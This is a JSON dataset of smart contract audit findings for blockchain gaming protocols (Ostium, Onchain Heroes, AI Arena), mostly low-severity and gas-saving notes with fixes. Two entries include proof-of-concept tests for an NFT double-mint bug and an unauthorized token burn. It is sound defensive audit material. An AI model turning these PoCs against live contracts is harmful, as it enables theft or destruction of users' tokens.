{
  "category": "Gaming",
  "total_findings": 154,
  "fetched_at": "2026-01-29T12:57:19Z",
  "findings": [
    {
      "id": "61523",
      "title": "[L-02] Inconsistent validation of `liqMarginThresholdP` and `maxNegativePnlOnOpenP`",
      "impact": "LOW",
      "content": "\nThe `liqMarginThresholdP` value is set via `_setLiqMarginThresholdP()`, which validates against a fixed `MAX_LIQ_MARGIN_THRESHOLD_P`. However, this value directly affects the valid range for `maxNegativePnlOnOpenP`, which is constrained to `value <= 100 - liqMarginThresholdP`.\n\nBecause there is no cross-check between these two parameters during updates, changing `liqMarginThresholdP` can indirectly invalidate the current `maxNegativePnlOnOpenP` value, potentially pushing it over its allowed limit.\n\nRecommendation\n\nIntroduce a validation in `_setLiqMarginThresholdP()` to ensure that the existing `maxNegativePnlOnOpenP` remains valid after the threshold is updated:\n\n```diff\n-       if (value > MAX_LIQ_MARGIN_THRESHOLD_P) { \n+       if (value > MAX_LIQ_MARGIN_THRESHOLD_P || maxNegativePnlOnOpenP > 100 - value) { \n            revert WrongParams();\n        }\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ostium_2025-04-06",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Ostium-security-review_2025-04-06.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "61522",
      "title": "[L-01] `maxLeverage` can be set lower than `minLeverage` overnight",
      "impact": "LOW",
      "content": "\nInside `_setPairOvernightMaxLeverage`, there is no validation to ensure `overnightMaxLeverage` is not lower than `groups[_pair.groupIndex].minLeverage`. Consider adding this validation to ensure proper configuration of `overnightMaxLeverage`.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ostium_2025-04-06",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Ostium-security-review_2025-04-06.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "61521",
      "title": "[M-01] Wrong collateral refund in liquidation when `liqPrice == priceAfterImpact`",
      "impact": "MEDIUM",
      "content": "\n## Severity\n\n**Impact:** High\n\n**Likelihood:** Low\n\n## Description\n\nWhen a liquidation is triggered and the Oracle price used results in `liqPrice == priceAfterImpact` during the execution of `executeAutomationCloseOrderCallback()`, the system may incorrectly refund a portion of the user collateral - approximately equal to the `liquidationFee`.\n\nThis occurs due to a discrepancy in how `value` and `liqMarginValue` are calculated within the `getTradeValuePure()` function. Under specific conditions (`liqPrice == priceAfterImpact`), `value` can become greater than `liqMarginValue`, even though the position should be fully liquidated.\n\nWithin the new `Margin-Based Liquidations` logic, users should not receive any collateral back during liquidation. The entire collateral should be distributed between the `liquidationFee` and the `Vault` to cover losing trade.\n\nHowever, do to the legacy refund logic that remains in the code:\n\n```solidity\n@>      uint256 usdcSentToVault = usdcLeftInStorage - usdcSentToTrader;\n        storageT.transferUsdc(address(storageT), address(this), usdcSentToVault);\n        vault.receiveAssets(usdcSentToVault, trade.trader);\n@>      if (usdcSentToTrader > 0) storageT.transferUsdc(address(storageT), trade.trader, usdcSentToTrader);\n```\n\nWith combination to the incorrect calculation of `value` and `liqMarginValue`, the `usdcSentToTrader` returned from the `getTradeValue()` function may end up being roughly equal to the `liquidationFee`, resulting in an unintended refund to the liquidated trader.\n\n## Recommendation\n\nEnsure that `usdcSentToTrader` is explicitly set to `0` during liquidation, preventing any collateral refund:\n\n```diff\n    if (liquidationFee > 0) {\n        storageT.transferUsdc(address(storageT), address(this), liquidationFee);\n        vault.distributeReward(liquidationFee);\n        emit VaultLiqFeeCharged(orderId, tradeId, trade.trader, liquidationFee);\n+\n+       usdcSentToTrader = 0;\n    }\n```\n\n\n\n",
      "summary": "\nThe report describes a bug in the system where during a liquidation process, the system may incorrectly refund a portion of the user's collateral. This happens because of a discrepancy in how certain values are calculated. The recommendation is to explicitly set a value to 0 during liquidation to prevent any unintended refunds. ",
      "quality_score": 4,
      "rarity_score": 3.6,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Ostium_2025-04-06",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Ostium-security-review_2025-04-06.md",
      "github_link": "",
      "tags": [
        "ABI Encoding"
      ],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "58267",
      "title": "[M-02] High-level Heroes Can Receive Guaranteed Bonus Rewards",
      "impact": "MEDIUM",
      "content": "## Severity\n\nMedium Risk\n\n## Description\n\nThe vulnerability exists in the `_getBonusRewards()` function within the VRF callback logic. The function uses a hero's level directly in a probability calculation without implementing proper bounds checking. Specifically, the condition `if (rN < (level << 1))` creates a scenario where heroes with levels above 500 will always receive bonus rewards regardless of the intended randomness.\n\nThe problematic logic occurs when determining bonus rewards distribution. The function generates a random number rN between 0 and 999 using `rN = (randomNumber >> 128) % 1000`, then compares it against `level << 1 `(level multiplied by 2). Since rN has a maximum value of 999, any hero with a level of 500 or higher will have `level << 1` equal to or greater than 1000, making the condition `rN < (level << 1)` always evaluate to true. This effectively guarantees that high-level heroes will receive bonus rewards on every unstaking operation, breaking the intended probabilistic reward system.\n\n## Location of Affected Code\n\nFile: [src/Fishing/Fishing.sol#L487](https://github.com/onchain-heroes/och-contracts/blob/33ae3d7c2f9f201d085858c26503b624fba184cd/src/Fishing/Fishing.sol#L487)\n\n```solidity\nfunction _getBonusRewards(uint256 randomNumber, uint256 level, uint256 zone, uint256 weaponSharedChances) internal pure returns (uint256 weaponShard, uint256 bonusRewards) {\n    uint256 rN = randomNumber % 100;\n\n    if (rN < weaponSharedChances) {\n        weaponShard = 1;\n    }\n\n    rN = (randomNumber >> 128) % 1000;\n    // @audit above 500 level they will receive guaranteed  tokens\n    if (rN < (level << 1)) {\n        // if `zone==0` means user get bronze gachaToken\n        // if `zone==1` means user get s2 training voucher\n        // if `zone==2` means user get s2 repair voucher\n        bonusRewards = zone + 1;\n    }\n\n    // Return weapon shard and bonus rewards.\n    return (weaponShard, bonusRewards);\n}\n```\n\n## Impact\n\nHigh-level hero owners gain an unfair advantage by receiving guaranteed bonus rewards, which include valuable items such as bronze gacha tokens, training vouchers, and repair vouchers, depending on the fishing zone.\n\n## Recommendation\n\nThe vulnerability should be addressed by implementing a robust probability calculation system that handles all edge cases while maintaining fair reward distribution across all hero levels.\n\n## Team Response\n\nAcknowledged.",
      "summary": "\nThis bug report describes a vulnerability in a function called `_getBonusRewards()` that is used in a game. This function calculates the bonus rewards that a player receives when they complete a certain task. The problem is that the function does not check the hero's level properly, which means that players with high-level heroes will always get bonus rewards, regardless of chance. This gives these players an unfair advantage in the game. The bug has been identified and the team is working on fixing it.",
      "quality_score": 4.5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Onchainheroes Fishingvoyages",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/OnchainHeroes-FishingVoyages-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "58266",
      "title": "[M-01] User Can Bypass Fishing Duration and Unstake Immediately Due to Uninitialized `stakeDuration`",
      "impact": "MEDIUM",
      "content": "## Severity\n\nMedium Risk\n\n## Description\n\nThe `Fishing` contract contains an initialization flaw that allows users to bypass the intended fishing duration mechanism. The vulnerability stems from inadequate validation during the staking process, specifically in the `stakeMany()` function. When the contract is deployed, the `stakeDuration` variable within the `FisherCatStorage` struct defaults to zero and remains uninitialized until the owner explicitly calls `setStakeDuration()`. However, the `stakeMany()` function only validates that the zone fee is non-zero through the condition `if (fee == 0) revert RewardsNotSet()` but fails to verify that `stakeDuration` has been properly configured.\n\nThis oversight creates a window of opportunity where users can stake their heroes immediately after deployment but before the owner sets the stake duration. The vulnerability manifests during the unstaking process in the `unstakeMany()` function, where the time validation check `if (block.timestamp < (uint256(hero.stakeAt) + uint256($.stakeDuration))) revert HeroIsDoingFishing()` becomes ineffective. When `stakeDuration` equals zero, this condition simplifies to if `(block.timestamp < hero.stakeAt)`, which will always evaluate to false since `block.timestamp` is guaranteed to be greater than or equal to `hero.stakeAt` at the time of unstaking. Consequently, users can immediately unstake their heroes and claim rewards without waiting for any fishing duration.\n\n## Location of Affected Code\n\nFile: [src/Fishing/Fishing.sol#L207](https://github.com/onchain-heroes/och-contracts/blob/33ae3d7c2f9f201d085858c26503b624fba184cd/src/Fishing/Fishing.sol#L207)\n\n```solidity\nfunction stakeMany(uint256[] calldata heroIds, uint8 zone) external whenNotPausedOrEmergency {\n    // Checks zone is valid\n    if (zone > 2) revert InvalidZone();\n\n    uint256 len = heroIds.length;\n\n    // Get storage pointer\n    FisherCatStorage storage $ = _getStorage();\n\n    uint256 fee = $.zoneDetails[zone].fee;\n\n    // Checks entry fee is set\n    if (fee == 0) revert RewardsNotSet();\n\n    uint256 amount = fee * len;\n\n    if (amount != 0) {\n        // transfer `amount` of $HERO20 as entry fee from user to contract\n        hero20.transferFrom(msg.sender, address(this), amount);\n    }\n\n    for (uint256 i = 0; i < len; ++i) {\n        uint256 heroId = heroIds[i];\n\n        // Checks hero owner\n        if (msg.sender != hero721.ownerOf(heroId)) revert CallerIsNotOwner();\n\n        // Transfer hero721 to this contract\n        hero721.transferFrom(msg.sender, address(this), heroId);\n\n        // Update hero information\n        $.heroInfo[heroId] =\n            HeroInformation({owner: msg.sender, zone: zone, stakeAt: uint40(block.timestamp), pendingVRF: 0});\n\n        // Emit `Staked`.\n        emit Staked(msg.sender, heroId, zone, fee);\n    }\n}\n```\n\n## Impact\n\nUsers who discover this flaw can stake their heroes and immediately unstake them to claim rewards, effectively receiving free tokens without respecting the intended time commitment. This creates an unfair advantage over legitimate users who stake after the duration is properly set and must wait the full fishing period.\n\n## Recommendation\n\nThe vulnerability should be addressed by implementing validation checks in the `stakeMany()` function to ensure all critical parameters are properly initialized before allowing staking operations. The function should include an additional validation condition `if ($.stakeDuration == 0) revert RewardsNotSet()` immediately after the existing fee validation check.\n\n## Team Response\n\nAcknowledged.",
      "summary": "\nThe `Fishing` contract has a problem that allows users to get around the intended waiting time for fishing. This happens because the contract doesn't check if the waiting time has been set before allowing users to stake their heroes. This means that users can stake their heroes and immediately get their rewards without waiting. This gives them an unfair advantage over other users who follow the rules and have to wait for the full fishing period. The team has been notified about this issue. To fix it, they need to add a check in the `stakeMany()` function to make sure that all important settings are in place before allowing staking. This will prevent users from exploiting the flaw and ensure fair play for all users.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Onchainheroes Fishingvoyages",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/OnchainHeroes-FishingVoyages-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "55405",
      "title": "[C-02] Malicious users can mint the double Guaranteed Mints per RING",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\n`HeroERC721A.sol` is an NFT contract, It guarantees the first phase **OG Phase** the whitelisted addresses will get:\n\n- 1 Free Mint\n- 2 Guaranteed Mints per **RING** (RING is NFT, so they take a Snapshot for holders)\n\n`HeroERC721A.sol#ogMint()` function is how users mint tokens for OG whitelisted addresses.\nUsers who are eligible for the two types of OG mint have the flexibility to call `ogMint()` multiple times,\nSo they can take the free mint and the guaranteed mint in two different transactions.\n\nMalicious users can take this privilege to mint double the number of Guaranteed Mints tokens by:\n\n- 1. Call `ogMint()` and set `freeMint` to false and set `paidMintQty = 10` so `numOfRing = 5`.\n     It mints 10 NFT and this is how the `aux` will be:\n\n```\n 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000\n 1010 0000 0000 0000 0000 0000 0000\n```\n\n- 2. Call `ogMint()` and set `freeMint` to true and set `paidMintQty = 0`.\n     It mints 1 NFT (the free one), this is how the `aux` will be:\n\n```\n 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000\n 0000 0000 0000 0000 0000 0000 1000\n```\n\nWe can see that [24-63] is now empty. This is because `_ogMint()` deleted the old values in this step:\n\n```solidity\n uint64 aux = (_getAux(to) >> 3) & 0x0fffff;\n```\n\n- 3. Call `ogMint()` and set `freeMint` to false and set `paidMintQty = 10` so `numOfRing = 5`\n     It mints 10 NFT and the `aux` will be:\n\n```\n 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000\n 1010 0000 0000 0000 0000 0000 1000\n```\n\nSo, this Malicious has mint 20 from the OG paid mints when he only has 5 RING.\n\nNote:\nAux Bit Layout\nThe aux is a 64-bit number with the following bit layout:\n\n[0-1]: Tracking `publicMint` status\n[2-2]: Hero list mint tracking\n[3-23]: Tracking the number of OG free mints (capacity : 2\\***\\*20 -1)\n[24-63]: Tracking the number of OG paid mints (capacity : 2\\*\\***40 -1)\n\n**POC:**\n\n```solidity\n    function testMinting() public {\n        // og mint\n        vm.warp(uint256(hero721.OG_MINT_TIMESTAMP()));\n        bytes32[] memory b = new bytes32[](3);\n        b[0] = bytes32(0xf6cad13a027fce5304a21819a989779362a06a4fbd07521b18209cd6ddc4e41c);\n        b[1] = bytes32(0xc41bc74587e0ba059b462f9e0d8a6abd430876040e77e050ca8ec3f11d8bab38);\n        b[2] = bytes32(0x31d93cf3542a493f93d6d5304dc473819fb4d0bf018b05c910f1802ea619ab5d);\n\n        hero721.ogMint{value: 4e17}(ALICE, false, 4, 2, b);\n\n        hero721.ogMint{value: 0}(ALICE, true, 0, 2, b);\n\n        hero721.ogMint{value: 4e17}(ALICE, false, 4, 2, b);\n        assertEq(hero721.balanceOf(ALICE), 10);\n    }\n\n```\n\n## Recommendations\n\n```diff\n    function _ogMint(address to, uint64 numOfRings) internal {\n+        uint64 _aux = _getAux(to);\n+        uint64 aux = (_aux >> 3) & 0x0fffff;\n-        uint64 aux = (_getAux(to) >> 3) & 0x0fffff;\n        if (aux == numOfRings) revert AlreadyMinted();\n-        _setAux(to, uint64(aux | (numOfRings << 3))); // Set OG free mint flag\n+        _setAux(to, uint64(_aux | (numOfRings << 3))); // Set OG free mint flag\n        _safeMint(to, numOfRings);\n    }\n```",
      "summary": "\nThis report discusses a bug found in the `HeroERC721A.sol` contract, which is used for NFTs (non-fungible tokens). The bug allows malicious users to mint more tokens than they are supposed to by taking advantage of the contract's functionality. This bug has a high impact and likelihood of occurring. The report provides a proof of concept (POC) code to demonstrate how the bug can be exploited. The report recommends a code change to fix the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "OnchainHeroes_2025-01-13",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/OnchainHeroes-security-review_2025-01-13.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "55404",
      "title": "[C-01] Unauthorized access to burn Gotcha token",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\nTwo functions are affected here: `burnFrom` and `brun`\n\n- `burnFrom`: `GachaToken::burnFrom` has four inputs, `address by, address from, uint256 id, uint256 amount`, here is a description for `address by`:\n\n```\n        // - If `by` is not the zero address, it must be either `from`,\n        //   or approved to manage the tokens of `from`.\n```\n\nAn attacker could set `by` as zero or any approved address and burn tokens.\n\n- `burn`: this function calls `_burn` function, in `_burn`:\n\n```solidity\n    function _burn(address from, uint256 id, uint256 amount) internal virtual {\n        _burn(address(0), from, id, amount);\n    }\n```\n\nIt sets `by` as a zero address (just like the above attack path).\n\nHere is the POC for setting `by` as a zero address.\n\n**POC:**\n\n```solidity\n    function testBurn_gotcha_token() public {\n        vm.prank(address(endgame));\n        gachaToken.mint(owner, 1, 100);\n        assertEq(gachaToken.balanceOf(owner, 1), 100);\n\n        vm.prank(user1);\n        // gachaToken.burnFrom(by, from, id, amount);\n        //@audit by setting `by` as 0, it should be able to burn from any address\n        gachaToken.burnFrom(address(0), owner, 1, 100);\n        assertEq(gachaToken.balanceOf(owner, 1), 0);\n    }\n```\n\n## Recommendations\n\n1. Delete `burnFrom`.\n2. Modify `burn` as follows:\n\n```solidity\n    function burn(address from, uint256 id, uint256 amount) external {\n        _burn(msg.sender, from, id, amount);\n    }\n```",
      "summary": "\nThis bug report found a problem with two functions in the GachaToken code, `burnFrom` and `burn`. The problem allows an attacker to set the `by` input as a zero address or any approved address, which can then be used to burn tokens. The report suggests deleting the `burnFrom` function and modifying the `burn` function to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "OnchainHeroes_2025-01-13",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/OnchainHeroes-security-review_2025-01-13.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "32236",
      "title": "[G-19] `AiArenaHelper` constructor sets probabilities twice",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L41-L52\n\n### Description\n\nNotice below that the constructor sets the probabilities twice:\n\n```solidity\n    constructor(uint8[][] memory probabilities) {\n        _ownerAddress = msg.sender;\n\n        // Initialize the probabilities for each attribute\n        addAttributeProbabilities(0, probabilities);\n\n        uint256 attributesLength = attributes.length;\n        for (uint8 i = 0; i < attributesLength; i++) {\n            attributeProbabilities[0][attributes[i]] = probabilities[i];\n            attributeToDnaDivisor[attributes[i]] = defaultAttributeDivisor[i];\n        }\n    } \n```\n\n### Recommended Fix\n\nRemove the `for` loop.\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1798#issuecomment-1975526126)**\n\n\n\n***\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32235",
      "title": "[G-18] `AiArenaHelper.createPhysicalAttributes()` should check for `iconsType` before running icons-relevant code since icons fighters are rare",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L100-L105\n\n### Description\n\nSince icon fighter NFTs are rare, the below checks related to icons should not run for non-icon fighters.\n\n```solidity\n            for (uint8 i = 0; i < attributesLength; i++) {\n                if (\n                  i == 0 && iconsType == 2 || // Custom icons head (beta helmet)\n                  i == 1 && iconsType > 0 || // Custom icons eyes (red diamond)\n                  i == 4 && iconsType == 3 // Custom icons hands (bowling ball)\n                ) {\n                    finalAttributeProbabilityIndexes[i] = 50;\n                } else {\n                    //set finalAttributeProbabilityIndexes[i] a different way\n```\n\n### Recommended Fix\n\nInstead of running through all 3 icons checks every time, check to see if `iconsType` is greater than zero before running through the 3 checks.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32234",
      "title": "[G-17] DNA rarity calculation in `AiArenaHelper.dnaToIndex()` can be redesigned to save gas",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L108<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L169-L186\n\n### Description\n\n`dnaToIndex()` is called inside a loop for all the fighter physical properties (see first link), which consumes a lot of gas due to storage loads. The system of calculating `attributeProbabilityIndex` by looping through the probabilities and comparing the `cumProb` to `rarityRank` could be refactored to retain the same functionality but save a lot of gas.\n\n`dnaToIndex()` function below for reader convenience:\n```solidity\n    function dnaToIndex(uint256 generation, uint256 rarityRank, string memory attribute) \n        public \n        view \n        returns (uint256 attributeProbabilityIndex) \n    {\n        uint8[] memory attrProbabilities = getAttributeProbabilities(generation, attribute);\n        \n        uint256 cumProb = 0;\n        uint256 attrProbabilitiesLength = attrProbabilities.length;\n        for (uint8 i = 0; i < attrProbabilitiesLength; i++) {\n            cumProb += attrProbabilities[i];\n            if (cumProb >= rarityRank) {\n                attributeProbabilityIndex = i + 1;\n                break;\n            }\n        }\n        return attributeProbabilityIndex;\n    }\n```\n\n### Recommended Fix\n\nRefactor attribute index/rarity calculation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32233",
      "title": "[G-16] `MergingPool.pickWinner()` and `MergingPool.claimRewards()` can be refactored so that users don't have to iterate through the entire array of winners for every round",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L151-L153\n\n### Description\n\nNotice how `claimRewards()` detects if the caller has rewards to claim in a round:\n```solidity\n            winnersLength = winnerAddresses[currentRound].length;\n            for (uint32 j = 0; j < winnersLength; j++) {\n                if (msg.sender == winnerAddresses[currentRound][j]) {\n```\nThis method is very gas inefficient since `winnerAddresses` is in storage.\n\n### Recommended Fix\n\nInstead of iterating through all the winner addresses in every round, `MergingPool.pickWinner()` and `MergingPool.claimRewards()` could be refactored to increment a new state variable tracking number of rewards (per round, if desired).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32232",
      "title": "[G-15] `MergingPool.claimRewards()` should update `numRoundsClaimed` after the loop ends instead of incrementing it in every loop",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L150\n\n### Description\n\nThe below code is not gas efficient due to SSTORE/SLOAD of the `numRoundsClaimed` state variable in every loop.\n\n```solidity\n    function claimRewards(\n        string[] calldata modelURIs, \n        string[] calldata modelTypes,\n        uint256[2][] calldata customAttributes\n    ) \n        external \n    {\n        uint256 winnersLength;\n        uint32 claimIndex = 0;\n        uint32 lowerBound = numRoundsClaimed[msg.sender];\n        for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {\n            numRoundsClaimed[msg.sender] += 1;\n```\n\n### Recommended Fix\n\nInstead of incrementing the state variable in every loop, increment a local variable and then update the state variable after the loop ends.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32231",
      "title": "[G-14] `FighterFarm._createFighterBase()` performs unnecessary check when minting dendroid",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L484-L531<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L462-L474<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L83-L94\n\n### Description\n\nNotice below that `_createNewFighter()` only uses `newDna` when calling `AiArenaHelper.createPhysicalAttributes()`:\n```solidity\n    function _createNewFighter(\n        ...\n        uint256 element; \n        uint256 weight;\n        uint256 newDna;\n        if (customAttributes[0] == 100) {\n            (element, weight, newDna) = _createFighterBase(dna, fighterType);\n        }\n        else {\n            element = customAttributes[0];\n            weight = customAttributes[1];\n            newDna = dna;\n        }\n        uint256 newId = fighters.length;\n\n        bool dendroidBool = fighterType == 1;\n        FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(\n            newDna,\n            generation[fighterType],\n            iconsType,\n            dendroidBool\n        );\n        //newDna is not used after this point\n    ...\n    function _createFighterBase(\n        uint256 dna, \n        uint8 fighterType\n    ) \n        private \n        view \n        returns (uint256, uint256, uint256) \n    {\n        uint256 element = dna % numElements[generation[fighterType]];\n        uint256 weight = dna % 31 + 65;\n        uint256 newDna = fighterType == 0 ? dna : uint256(fighterType); //This check is not needed\n        return (element, weight, newDna);\n    }\n```\n\nThe above check in `_createFighterBase()` that sets dendroid fighters' (`fighterType` equals 1) `newDna` to a different value is not necessary, because `newDna` will not be used in `AiArenaHelper.createPhysicalAttributes()` when creating a dendroid and there are only two fighter types:\n```solidity\n    function createPhysicalAttributes(\n        uint256 dna, \n        uint8 generation, \n        uint8 iconsType, \n        bool dendroidBool\n    ) \n        external \n        view \n        returns (FighterOps.FighterPhysicalAttributes memory) \n    {\n        if (dendroidBool) {\n            return FighterOps.FighterPhysicalAttributes(99, 99, 99, 99, 99, 99);\n```\n\n### Recommended Fix\n\nInstances of `newDna` can be removed and `dna` used instead, since `dna` will not change for non-dendroid fighters and `newDna` is not used when creating a dendroid fighter. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32230",
      "title": "[G-13] `FighterFarm._beforeTokenTransfer()` can be deleted to save an extra function call",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L451<br>\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/token/ERC721/extensions/ERC721Enumerable.sol#L60\n\n### Description\n\nNote the code below:\n```solidity\ncontract FighterFarm is ERC721, ERC721Enumerable {\n    ...\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId)\n        internal\n        override(ERC721, ERC721Enumerable)\n    {\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n```\nInheritance in solidity is right-to-left and `super._beforeTokenTransfer(from, to, tokenId);` will call the `_beforeTokenTransfer()` method in `ERC721Enumerable`. Therefore, this function can be deleted and the functionality will be the same while eliminating an extra function call and saving gas.\n\n### Recommended Fix\n\nRemove `FighterFarm._beforeTokenTransfer()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32229",
      "title": "[G-12] Balance check in `FighterFarm.reRoll()` is not necessary since `transferFrom()` will revert in case of insufficient balance",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L373\n\n### Description\n\nIn the function below, the balance require check is not necessary due to `transferFrom()` implementation.\n```solidity\n    function reRoll(uint8 tokenId, uint8 fighterType) public {\n        require(msg.sender == ownerOf(tokenId));\n        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);\n        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, \"Not enough NRN for reroll\"); //Can delete\n\n        _neuronInstance.approveSpender(msg.sender, rerollCost);\n        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost); //Will revert if balance is insufficient\n```\n\n### Recommended Fix\n\nDelete the `balanceOf()` require check.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32228",
      "title": "[G-11] `FighterFarm.sol` inherits `ERC721Enumerable` but the codebase doesn't use any of the enumerable methods",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L16\n\n### Description\n\nSolely inheriting `ERC721` in the `FighterFarm` contract would save on deployment costs since the codebase doesn't use the enumerable methods.\n\n### Recommended Fix\n\nIf desired, don't inherit from `ERC721Enumerable`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32227",
      "title": "[G-10] Unnecessary equality comparison in `RankedBattle._updateRecord()`",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L505-L513\n\n### Description\n\nThere are only three cases for `battleResult`, so below it's not necessary to check the result 3 times. An `else` block can replace the second `else if` block.\n```solidity\n    function _updateRecord(uint256 tokenId, uint8 battleResult) private {\n        if (battleResult == 0) {\n            fighterBattleRecord[tokenId].wins += 1;\n        } else if (battleResult == 1) {\n            fighterBattleRecord[tokenId].ties += 1;\n        } else if (battleResult == 2) {\n            fighterBattleRecord[tokenId].loses += 1;\n        }\n    }\n```\n\n### Recommended Fix\n\n```diff\n-       } else if (battleResult == 2) {\n+       } else {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
